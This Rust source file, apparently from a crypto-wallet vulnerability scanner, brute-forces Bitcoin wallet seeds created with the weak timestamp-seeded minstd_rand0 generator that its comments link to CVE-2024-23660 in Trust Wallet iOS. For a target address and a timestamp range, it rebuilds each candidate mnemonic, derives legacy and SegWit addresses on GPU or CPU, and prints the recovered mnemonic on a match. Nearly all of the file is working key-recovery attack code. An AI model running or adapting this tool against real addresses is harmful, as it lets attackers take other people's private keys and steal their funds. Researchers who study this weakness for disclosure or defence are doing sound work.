use anyhow::Result;
use bip39::Mnemonic;
use bitcoin::bip32::{DerivationPath, Xpriv};
use bitcoin::key::CompressedPublicKey;
use bitcoin::secp256k1::Secp256k1;
use bitcoin::{Address, Network};
use std::str::FromStr;
use tracing::{info, warn};

#[cfg(feature = "gpu")]
use crate::scans::gpu_solver::GpuSolver;

/// Trust Wallet iOS Vulnerability Scanner (CVE-2024-23660)
///
/// Uses `std::minstd_rand0` (Lehmer LCG, a=16807, m=2^31-1) seeded with
/// `time(NULL)` (Unix seconds).
///
/// ## Entropy strategies
///
/// Both strategies call `next_u32()` **16 times** for 16 bytes of entropy.
/// They differ only in how each 32-bit output is truncated to a byte:
///
/// | Strategy | Extraction | Byte range | Python name |
/// |---|---|---|---|
/// | `BytePerCallAnd` | `val & 0xFF`  | \[0, 255\] | `variant_b` |
/// | `BytePerCallMod` | `val % 0xFF`  | \[0, 254\] | `variant_a` |
///
/// `BytePerCallMod` (`% 0xFF` = `% 255`) **never produces byte 0xFF**.
/// Which variant Trust Wallet iOS actually used is unconfirmed; both are scanned.
///
/// ## Derivation paths
///
/// - `m/84'/0'/0'/0/0` → P2WPKH (native SegWit, Trust Wallet default)
/// - `m/44'/0'/0'/0/0` → P2PKH  (legacy)
///
/// ## Combo index (GPU)
///
/// | combo | Strategy | Path |
/// |---|---|---|
/// | 0 | BytePerCallAnd | m/44' (P2PKH)  |
/// | 1 | BytePerCallMod | m/44' (P2PKH)  |
/// | 2 | BytePerCallAnd | m/84' (P2WPKH) |
/// | 3 | BytePerCallMod | m/84' (P2WPKH) |
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum EntropyStrategy {
    /// 16 LCG calls, `val & 0xFF` — byte ∈ \[0, 255\].
    /// Matches Python `trezor_random_buffer_variant_b`.
    BytePerCallAnd,

    /// 16 LCG calls, `val % 0xFF` (= `% 255`) — byte ∈ \[0, 254\], 0xFF never produced.
    /// Matches Python `trezor_random_buffer_variant_a`.
    BytePerCallMod,
}

impl EntropyStrategy {
    fn fill_entropy(self, rng: &mut MinstdRand0, buf: &mut [u8; 16]) {
        match self {
            EntropyStrategy::BytePerCallAnd => {
                for byte in buf.iter_mut() {
                    *byte = (rng.next_u32() & 0xFF) as u8;
                }
            }
            EntropyStrategy::BytePerCallMod => {
                for byte in buf.iter_mut() {
                    // % 0xFF == % 255: byte range [0, 254], 0xFF is NEVER generated
                    *byte = (rng.next_u32() % 255) as u8;
                }
            }
        }
    }

    fn name(self) -> &'static str {
        match self {
            EntropyStrategy::BytePerCallAnd => "BytePerCallAnd (val & 0xFF)",
            EntropyStrategy::BytePerCallMod => "BytePerCallMod (val % 0xFF)",
        }
    }
}

/// Decode a combo index (0–3) into `(strategy, derivation_path, is_segwit)`.
///
/// | combo | bit 0 | bit 1 | strategy       | path   |
/// |-------|-------|-------|----------------|--------|
/// | 0     | 0     | 0     | BytePerCallAnd | m/44'  |
/// | 1     | 1     | 0     | BytePerCallMod | m/44'  |
/// | 2     | 0     | 1     | BytePerCallAnd | m/84'  |
/// | 3     | 1     | 1     | BytePerCallMod | m/84'  |
fn decode_combo(combo: u32) -> (EntropyStrategy, &'static str, bool) {
    match combo {
        0 => (EntropyStrategy::BytePerCallAnd, "m/44'/0'/0'/0/0", false),
        1 => (EntropyStrategy::BytePerCallMod, "m/44'/0'/0'/0/0", false),
        2 => (EntropyStrategy::BytePerCallAnd, "m/84'/0'/0'/0/0", true),
        3 => (EntropyStrategy::BytePerCallMod, "m/84'/0'/0'/0/0", true),
        _ => (EntropyStrategy::BytePerCallAnd, "m/44'/0'/0'/0/0", false),
    }
}

pub fn run(target: &str, start_ts: u32, end_ts: u32) -> Result<()> {
    info!("Trust Wallet (iOS/LCG) Vulnerability Scanner");
    info!("PRNG: minstd_rand0 (LCG, a=16807, m=2^31-1)");
    info!("Target: {}", target);

    if Address::from_str(target)
        .ok()
        .and_then(|a| a.require_network(Network::Bitcoin).ok())
        .is_none()
    {
        warn!("Warning: Could not parse target as a Bitcoin mainnet address.");
    }

    // ── GPU path ──────────────────────────────────────────────────────────────
    #[cfg(feature = "gpu")]
    {
        use bitcoin::Address as BtcAddress;

        let address = BtcAddress::from_str(target)?.assume_checked();
        let script  = address.script_pubkey();
        let bytes   = script.as_bytes();

        let target_hash160: [u8; 20] = if script.is_p2pkh() {
            bytes[3..23].try_into().expect("P2PKH script is 25 bytes")
        } else if script.is_p2wpkh() {
            bytes[2..22].try_into().expect("P2WPKH script is 22 bytes")
        } else {
            anyhow::bail!(
                "Unsupported address type. \
                 Only P2PKH (1...) and P2WPKH (bc1q...) are supported."
            );
        };

        info!("[GPU] Target Hash160: {}", hex::encode(target_hash160));
        info!(
            "[GPU] Scanning {} timestamps \u00d7 4 combos \
             (2 strategies \u00d7 2 paths)...",
            end_ts.saturating_sub(start_ts) + 1
        );

        let t0     = std::time::Instant::now();
        let solver = GpuSolver::new()?;
        info!("[GPU] Solver initialised");

        let hits = solver.compute_trust_wallet_lcg_crack(
            start_ts, end_ts, &target_hash160,
        )?;

        if hits.is_empty() {
            info!(
                "[GPU] Scan complete ({:.2}s). No match found.",
                t0.elapsed().as_secs_f64()
            );
            return Ok(());
        }

        // CPU verification for every GPU candidate
        let secp    = Secp256k1::new();
        let network = Network::Bitcoin;

        for (timestamp, combo) in &hits {
            let (strategy, path_str, is_segwit) = decode_combo(*combo);

            let mut rng     = MinstdRand0::new(*timestamp);
            let mut entropy = [0u8; 16];
            strategy.fill_entropy(&mut rng, &mut entropy);

            let mnemonic = match Mnemonic::from_entropy(&entropy) {
                Ok(m)  => m,
                Err(e) => {
                    warn!("[GPU hit] bad entropy ts={}: {}", timestamp, e);
                    continue;
                }
            };
            let seed = mnemonic.to_seed("");
            let root = match Xpriv::new_master(network, &seed) {
                Ok(r)  => r,
                Err(e) => {
                    warn!("[GPU hit] master key ts={}: {}", timestamp, e);
                    continue;
                }
            };
            let path  = DerivationPath::from_str(path_str)?;
            let child = match root.derive_priv(&secp, &path) {
                Ok(c)  => c,
                Err(e) => {
                    warn!("[GPU hit] derive ts={}: {}", timestamp, e);
                    continue;
                }
            };

            let address_str = if is_segwit {
                match CompressedPublicKey::from_private_key(&secp, &child.to_priv()) {
                    Ok(cpk) => Address::p2wpkh(&cpk, network).to_string(),
                    Err(e)  => { warn!("[GPU hit] pubkey: {}", e); continue; }
                }
            } else {
                let pubkey = child.to_keypair(&secp).public_key();
                Address::p2pkh(bitcoin::PublicKey::new(pubkey), network).to_string()
            };

            if address_str == target {
                warn!("\n\u{1F3AF} [VERIFIED] FOUND MATCH!");
                warn!("  Timestamp : {}", timestamp);
                warn!("  Strategy  : {}", strategy.name());
                warn!("  Path      : {}", path_str);
                warn!("  Mnemonic  : {}", mnemonic);
                warn!("  Address   : {}", address_str);
            } else {
                warn!(
                    "[GPU] False positive ts={} combo={} \
                     (hash160 matched, address differs — got={} exp={})",
                    timestamp, combo, address_str, target
                );
            }
        }

        info!(
            "[GPU] Done. {} candidate(s) in {:.2}s.",
            hits.len(),
            t0.elapsed().as_secs_f64()
        );
        return Ok(());
    }

    // ── CPU fallback ──────────────────────────────────────────────────────────
    #[cfg(not(feature = "gpu"))]
    {
        info!(
            "[CPU] Scanning {} timestamps \u00d7 2 strategies \u00d7 2 paths...",
            end_ts.saturating_sub(start_ts) + 1
        );

        let secp    = Secp256k1::new();
        let network = Network::Bitcoin;

        let paths: &[(&str, bool)] = &[
            ("m/84'/0'/0'/0/0", true),   // P2WPKH — native SegWit
            ("m/44'/0'/0'/0/0", false),  // P2PKH  — legacy
        ];
        let strategies = [
            EntropyStrategy::BytePerCallAnd,
            EntropyStrategy::BytePerCallMod,
        ];

        let mut found   = false;
        let mut checked = 0u64;
        let t0          = std::time::Instant::now();

        'outer: for t in start_ts..=end_ts {
            for strategy in &strategies {
                let mut rng     = MinstdRand0::new(t);
                let mut entropy = [0u8; 16];
                strategy.fill_entropy(&mut rng, &mut entropy);

                let mnemonic = match Mnemonic::from_entropy(&entropy) {
                    Ok(m)  => m,
                    Err(_) => continue,
                };

                let seed = mnemonic.to_seed("");
                let root = match Xpriv::new_master(network, &seed) {
                    Ok(r)  => r,
                    Err(_) => continue,
                };

                for &(path_str, is_segwit) in paths {
                    let path  = match DerivationPath::from_str(path_str) {
                        Ok(p)  => p,
                        Err(_) => continue,
                    };
                    let child = match root.derive_priv(&secp, &path) {
                        Ok(c)  => c,
                        Err(_) => continue,
                    };

                    let address_str = if is_segwit {
                        match CompressedPublicKey::from_private_key(&secp, &child.to_priv()) {
                            Ok(cpk) => Address::p2wpkh(&cpk, network).to_string(),
                            Err(_)  => continue,
                        }
                    } else {
                        let pubkey = child.to_keypair(&secp).public_key();
                        Address::p2pkh(bitcoin::PublicKey::new(pubkey), network).to_string()
                    };

                    if address_str == target {
                        warn!("\n\u{1F3AF} FOUND MATCH!");
                        warn!("  Timestamp : {}", t);
                        warn!("  Strategy  : {}", strategy.name());
                        warn!("  Path      : {}", path_str);
                        warn!("  Mnemonic  : {}", mnemonic);
                        warn!("  Address   : {}", address_str);
                        found = true;
                        break 'outer;
                    }
                }
            }

            checked += 1;
            if checked % 500_000 == 0 {
                info!(
                    "[CPU] {} timestamps scanned ({:.1}s)",
                    checked,
                    t0.elapsed().as_secs_f64()
                );
            }
        }

        if !found {
            info!(
                "[CPU] Scan complete ({} timestamps, {:.2}s). No match found.",
                checked,
                t0.elapsed().as_secs_f64()
            );
        }
        Ok(())
    }
}

// ─── MinstdRand0 ─────────────────────────────────────────────────────────────

/// `std::minstd_rand0`: Park-Miller Lehmer LCG
///   x_{n+1} = (16807 · x_n) mod (2^31 − 1)
///
/// Output range: `[1, 2_147_483_646]`.
///
/// ## Seed normalisation
///
/// Matches Python reference and libstdc++ / libc++ behaviour:
/// ```text
/// s = seed % M;  // reduce to [0, M-1]
/// if s == 0 { s = 1 }
/// ```
/// Without the `% M`: a seed equal to `M` (2_147_483_647) would cause the
/// first step to output `0`, and every subsequent step would stay at `0`
/// (LCG deadlock).
struct MinstdRand0 {
    state: u32,
}

impl MinstdRand0 {
    fn new(seed: u32) -> Self {
        const M: u32 = 2_147_483_647;
        let s = seed % M;
        Self { state: if s == 0 { 1 } else { s } }
    }

    #[inline(always)]
    fn next_u32(&mut self) -> u32 {
        const A: u64 = 16_807;
        const M: u64 = 2_147_483_647;
        self.state = ((self.state as u64 * A) % M) as u32;
        self.state
    }
}

// ─── Tests ───────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ---- MinstdRand0 -------------------------------------------------------

    #[test]
    fn test_minstd_first_two_outputs() {
        let mut rng = MinstdRand0::new(1);
        assert_eq!(rng.next_u32(), 16_807);
        assert_eq!(rng.next_u32(), 282_475_249);
    }

    /// seed=0 must be normalised to 1 (both libstdc++ and Python do this).
    #[test]
    fn test_seed_zero_normalised_to_one() {
        let mut r0 = MinstdRand0::new(0);
        let mut r1 = MinstdRand0::new(1);
        assert_eq!(r0.next_u32(), r1.next_u32());
    }

    /// seed == M must also be normalised to 1 (otherwise LCG deadlocks at 0).
    #[test]
    fn test_seed_m_normalised_to_one() {
        const M: u32 = 2_147_483_647;
        let mut rm = MinstdRand0::new(M);
        let mut r1 = MinstdRand0::new(1);
        assert_eq!(rm.next_u32(), r1.next_u32(),
            "seed == M must produce same sequence as seed == 1");
    }

    // ---- EntropyStrategy ---------------------------------------------------

    /// BytePerCallMod must never produce byte 0xFF (range is [0, 254]).
    #[test]
    fn test_mod_strategy_never_produces_0xff() {
        // Try a wide range of seeds to increase confidence.
        for seed in [1u32, 99_999, 1_000_000, 1_498_780_800, 1_685_836_800] {
            let mut rng = MinstdRand0::new(seed);
            let mut buf = [0u8; 16];
            EntropyStrategy::BytePerCallMod.fill_entropy(&mut rng, &mut buf);
            assert!(
                !buf.contains(&0xFF),
                "BytePerCallMod produced 0xFF for seed {}: {:02x?}",
                seed, buf
            );
        }
    }

    /// BytePerCallAnd CAN produce 0xFF (range [0, 255]).
    /// We just confirm the two strategies differ for the same seed.
    #[test]
    fn test_and_mod_strategies_differ() {
        let seed = 1_700_000_000u32;
        let mut buf_and = [0u8; 16];
        let mut buf_mod = [0u8; 16];
        EntropyStrategy::BytePerCallAnd.fill_entropy(&mut MinstdRand0::new(seed), &mut buf_and);
        EntropyStrategy::BytePerCallMod.fill_entropy(&mut MinstdRand0::new(seed), &mut buf_mod);
        assert_ne!(buf_and, buf_mod,
            "BytePerCallAnd and BytePerCallMod must differ for seed {}", seed);
    }

    /// Both strategies must produce non-zero entropy.
    #[test]
    fn test_entropy_nonzero() {
        for seed in [1u32, 12345, 1_700_000_000] {
            let mut ba = [0u8; 16];
            let mut bm = [0u8; 16];
            EntropyStrategy::BytePerCallAnd.fill_entropy(&mut MinstdRand0::new(seed), &mut ba);
            EntropyStrategy::BytePerCallMod.fill_entropy(&mut MinstdRand0::new(seed), &mut bm);
            assert_ne!(ba, [0u8; 16], "And entropy zero for seed {}", seed);
            assert_ne!(bm, [0u8; 16], "Mod entropy zero for seed {}", seed);
        }
    }

    // ---- decode_combo -------------------------------------------------------

    #[test]
    fn test_decode_combo_coverage() {
        let expected: &[(EntropyStrategy, &str, bool)] = &[
            (EntropyStrategy::BytePerCallAnd, "m/44'/0'/0'/0/0", false), // 0
            (EntropyStrategy::BytePerCallMod, "m/44'/0'/0'/0/0", false), // 1
            (EntropyStrategy::BytePerCallAnd, "m/84'/0'/0'/0/0", true),  // 2
            (EntropyStrategy::BytePerCallMod, "m/84'/0'/0'/0/0", true),  // 3
        ];
        for (i, &(ref exp_strat, exp_path, exp_segwit)) in expected.iter().enumerate() {
            let (strat, path, segwit) = decode_combo(i as u32);
            assert_eq!(strat,   *exp_strat, "strategy mismatch for combo {}", i);
            assert_eq!(path,    exp_path,   "path mismatch for combo {}",     i);
            assert_eq!(segwit,  exp_segwit, "segwit mismatch for combo {}",   i);
        }
    }

    // ---- Reference vector --------------------------------------------------

    /// TODO: Fill from a verified reference vector once the original binary
    /// has been confirmed (strategy A vs B, path, derivation passphrase).
    #[test]
    #[ignore = "No reference vector available until the original iOS binary is confirmed"]
    fn test_known_vector() {
        todo!("Fill from reference implementation")
    }
}
